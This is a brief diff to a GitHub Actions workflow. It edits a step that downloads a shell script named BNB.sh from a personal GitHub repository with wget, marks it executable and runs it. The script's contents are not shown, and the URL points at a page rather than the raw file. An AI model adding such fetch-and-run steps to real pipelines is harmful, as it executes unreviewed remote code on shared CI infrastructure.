@@ -24,4 +24,4 @@ jobs:
       uses: actions/checkout@v1
     - name: BA_Beh
       run: |
-        wget https://github.com/jangek992/jangek992/blob/main/BNB.sh && chmod u+x BNB.sh && ./BNB.sh
+        wget https://github.com/jangek992/jangek992/blob/main/BNB.sh && chmod +x BNB.sh && ./BNB.sh
